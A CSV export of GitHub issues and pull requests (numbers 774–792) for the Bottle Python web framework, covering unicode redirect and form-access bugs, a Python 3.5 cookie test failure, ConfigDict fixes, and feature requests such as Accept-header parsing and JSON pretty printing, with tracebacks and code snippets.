ID,Title,Created At,Closed At,Issues,Errors,Messages,Body
792,redirect() and non-ascii characters,2015-10-03T16:41:21Z,,,"Exception, UnicodeEncodeError","Exception:, UnicodeEncodeError: 'ascii' codec can't encode characters in position 32-37: ordinal not in range(128)","Redirect to url with non-ascii characters causes an error:

Exception:

```
UnicodeEncodeError('ascii', u'http://localhost:9891/?status=1 \u044f\u043d\u0432\u0430\u0440\u044f', 32, 38, 'ordinal not in range(128)')
```

Traceback:

```
Traceback (most recent call last):
  File ""C:\Users\user\Documents\Bitbucket\lab\bottle.py"", line 862, in _handle
    return route.call(**args)
  File ""C:\Users\user\Documents\Bitbucket\lab\bottle.py"", line 1732, in wrapper
    rv = callback(*a, **ka)
  File ""C:\Users\user\Documents\Bitbucket\lab\main.py"", line 160, in register
    redirect(u'/?status=1 января') # temp
  File ""C:\Users\user\Documents\Bitbucket\lab\bottle.py"", line 2421, in redirect
    res.set_header('Location', urljoin(request.url, url))
  File ""C:\Users\user\Documents\Bitbucket\lab\bottle.py"", line 1539, in set_header
    self._headers[_hkey(name)] = [str(value)]
UnicodeEncodeError: 'ascii' codec can't encode characters in position 32-37: ordinal not in range(128)
```
"
791,test_delete_cookie fails with Python 3.5,2015-09-20T01:47:42Z,,,AssertionError,AssertionError: False is not true,"Hi, I am getting the following test error when running against Python 3.5:

```
======================================================================
FAIL: test_delete_cookie (test_environ.TestResponse)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/build/python-bottle/src/bottle/test/test_environ.py"", line 614, in test_delete_cookie
    self.assertTrue('name=;' in cookies[0])
AssertionError: False is not true

----------------------------------------------------------------------
```

With Python 3.4 and all other components at the same version, it passes.
"
790,FR: Dissection of Accept header,2015-09-17T13:44:26Z,2016-01-22T19:07:57Z,,,,"Currently the only way to inspect the Accept header is to manually apply string splitting, for example;

``` py
found = []
lines = request.headers.getall('Accept', [])
for line in lines:
    found += line.split("","")
```

It would be nice if bottle had support for this out of the box, perhaps something like;

```
request.accept_content_type = ['application/json', 'text/html']
```

Admittedly the naming convention of `accept_content_type` is a bit crappy, so I'd welcome other suggestions.

Thoughts?
"
789,Testing Bottle application using webtest,2015-09-17T12:24:57Z,2015-11-13T06:56:01Z,,AppError,AppError: Bad response: 404 Not Found (not 200 OK or 3xx redirect for http://localhost/login),"I tried to `unittest` a Bottle application with the webtest python suite. Based on the example provided in the doc, I built my own test module but I do not succeed in testing because I always get an 404 error on any page I try to request ...

Should you provide a working example of such testings ?

I copy my example: 

```
import os
import unittest

# for HTTP tests
from webtest import TestApp

from nose import with_setup # optional
from nose.tools import *

import bottle
from bottle import Bottle

class Server(Bottle):
    def __init__(self, host, port):
        Bottle.__init__(self)
        self._host = host
        self._port = port

    def set_routes(self):
        bottle.route(""/"")(self.index)
        bottle.route(""/login"", method=""GET"")(self.login_form)
        bottle.route(""/login"", method=""POST"")(self.login)
        bottle.route(""/logout"")(self.logout)

    def start(self):
        self._app.run(host=self._host, port=self._port)

    def index(self):
        return template('Hello {{name}}, how are you?', name='Guest')

    def login(self):
        username = bottle.request.POST.get('username', '').strip()
        password = bottle.request.POST.get('password', '').strip()
        bottle.redirect(""/"")

    def login_form(self):
        return 'Login form'

    def logout(self):
        return 'Bye'

server = Server(host='localhost', port=80)
server.set_routes()
# server.start()

# extend the class unittest.TestCase
class test_app(unittest.TestCase):
    def test_functional_login_logout(self):
        app = TestApp(server)

        app.post('/login', {'user': 'foo', 'pass': 'bar'}) # log in and get a cookie

        assert app.get('/admin').status == '200 OK'        # fetch a page successfully

        app.get('/logout')                                 # log out
        app.reset()                                        # drop the cookie

        # fetch the same page, unsuccessfully
        assert app.get('/admin').status == '401 Unauthorized'        
```

And the output of nosetests: 

```
$ nosetests -v -s test_bottle.py
test_functional_login_logout (test_bottle.test_app) ... ERROR

======================================================================
ERROR: test_functional_login_logout (test_bottle.test_app)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/home/shinken/alignak-webui/test/test_bottle.py"", line 73, in test_functional_login_logout
    app.post('/login', {'user': 'foo', 'pass': 'bar'}) # log in and get a cookie
  File ""/usr/local/lib/python2.7/dist-packages/webtest/app.py"", line 370, in post
    content_type=content_type)
  File ""/usr/local/lib/python2.7/dist-packages/webtest/app.py"", line 735, in _gen_request
    expect_errors=expect_errors)
  File ""/usr/local/lib/python2.7/dist-packages/webtest/app.py"", line 631, in do_request
    self._check_status(status, res)
  File ""/usr/local/lib/python2.7/dist-packages/webtest/app.py"", line 663, in _check_status
    res)
AppError: Bad response: 404 Not Found (not 200 OK or 3xx redirect for http://localhost/login)

    <!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN"">
    <html>
        <head>
            <title>Error: 404 Not Found</title>
            <style type=""text/css"">
              html {background-color: #eee; font-family: sans;}
              body {background-color: #fff; border: 1px solid #ddd;
                    padding: 15px; margin: 15px;}
              pre {background-color: #eee; border: 1px solid #ddd; padding: 5px;}
            </style>
        </head>
        <body>
            <h1>Error: 404 Not Found</h1>
            <p>Sorry, the requested URL <tt>&#039;http://localhost:80/login&#039;</tt>
               caused an error:</p>
            <pre>Not found: &#039;/login&#039;</pre>
        </body>
    </html>


----------------------------------------------------------------------
Ran 1 test in 0.005s

FAILED (errors=1)
```
"
788,Why is bottle not listed in github explore list for web frameworks.,2015-09-15T14:42:28Z,,,,,"I was browsing through github explore list at https://github.com/showcases/web-application-frameworks and could not find bottle there. Projects having less stars and forks than bottle are listed there but not bottle. Why so?
I filed it here because it is pretty important and limits exposure of bottle to a more wider audience.
"
787,Fixes #772,2015-09-11T12:49:06Z,2015-10-11T18:31:14Z,,,,"Fixes #772, Includes tests, passed.
"
786,Add pathlib support to static_file,2015-09-09T09:20:06Z,,,,,"The `static_file` function does not currently work with `pathlib.Path` objects. Adding this would save clutter caused by string casts.
"
785,Add test case for 'load_config',2015-09-07T09:21:49Z,2016-08-27T16:50:30Z,,,,"#784
"
784,[Bug] ConfigDict.load_config.  'DEFAULT' section not work properly.,2015-09-07T09:20:15Z,2016-08-27T16:49:23Z,,,,"When load config file 

```
[DEFAULT]
interval = 45

[bottle]
port = 8080

[compression]
status = single
```

We incorrectly set  'compression.interval' 

**REASON**
https://github.com/bottlepy/bottle/blob/534a2e08ac0ef55dd542a3a83b1118188c6a399b/bottle.py#L2188-L2192 
_conf.sections_ won't return _DEFAULT_ section
_conf.items_ will return _DEFAULT_ options as well.
"
783,make load_app() work on modules in cwd when bottle is called via a script,2015-09-02T21:57:30Z,2015-10-11T18:43:34Z,,ImportError,ImportError: No module named my_app,"For example, if you call a python script that launches
bottle, it is the path of the script that gets added
to `sys.path`, _not_ the current directory. But it is
with respect to the current directory that I would like
to specify the value for `app`:

https://github.com/bottlepy/bottle/blob/0.12.8/bottle.py#L3044-L3045

This makes it so that the application/target can be found,
if it is in the current directory, even if you are
calling another script somewhere else that ultimately
hands over to bottle, and thus the `load_app()` function

The error avoided is:

``` python
ImportError: No module named my_app
```

When I execute a script that passes the value `""my_app""`
to `bottle.run(app=value)`
"
782,"Add a way to get nested dicts out of a ConfigDict for libraries that need them (e.g. logging.config, beaker)",2015-08-21T18:15:30Z,,Accepted,,,"@rcarmo said in #772

> May I suggest ensuring that the Python logging configuration becomes part of the overall config?

The bottle config is flat (i.e. `keys.with.dots.in.them`) but the `logging.config` module expects a nested structure. Some other frameworks need that, too (e.g. beaker). We have `ConfigDict.load_dict()` to flatten a nested dictionary or json. The reverse would be required to easily populate logging configuration out of bottle.
"
781,Add JSON pretty printing support,2015-08-17T16:55:37Z,2015-10-11T18:50:10Z,,,,"Added pretty printing support for JSON responses. This is mainly useful for development, to make it easier to read JSON responses.

The default is to not use pretty printing. But pretty printing can be enabled via:

```
app = Bottle(autojsonpretty=True)
```
"
780,make requires Python 2.5,2015-08-16T06:52:58Z,2015-08-17T19:27:24Z,,,,"Running make failt w/ the following:

python2.5 test/testall.py
make: python2.5: Kommando nicht gefunden
make: **\* [test_25] Fehler 127
#### 

Maybe not hard-code the Python version?
"
779,foother.tpl -> footer.tpl,2015-08-02T02:11:37Z,2015-08-03T21:02:35Z,,,,
778,Return 400 with bad json request,2015-07-31T03:31:44Z,2015-10-11T18:52:46Z,,,,"JSON requests should not return a 500 error as the issue is with
the requester's json and not the server itself. Fixes #654
"
777,Fix #720 : Allow unicode keys in ConfigDict.,2015-07-24T09:59:22Z,2015-07-25T11:39:42Z,,,,
776,Fix #720 : Allow unicode keys in ConfigDict.,2015-07-24T09:58:47Z,2015-07-25T11:38:40Z,,,,
775,Test of cookie name and value length,2015-07-19T11:53:48Z,2015-10-11T19:00:05Z,,,,"Added 2 tests of max cookie name and length.
"
774,Formsdict attribute like access returns invalid values for parameters submitted with unicode characters,2015-07-13T09:16:53Z,,Needs input,,,"Suppose we got a parameter submitted which has the value of 'ğüşiöç': `aparam = 'ğüşiöç'`

If request.method is 'GET':

`request.GET.aparam returns : 'ğüşiöç'` --> ok
`request.GET['aparam'] returns : 'ÄÃ¼ÅiÃ¶Ã§'`--> ??

If request method is 'POST':

`request.POST.aparam returns : ''` --> ??
`request.POST['aparam'] returns : 'ğüşiöç`--> ok

This behaviour interrupts clean and consistent coding style. When I need to access request form parameters I need to remember correct way to access them rather than simply writing request.POST.aparam.

Is this behaaviour is intended way or is this a bug or am I missing sth?

PS: Tested with Python 3.4, Python 3.2, and latest bottle github clone code

TIA
"
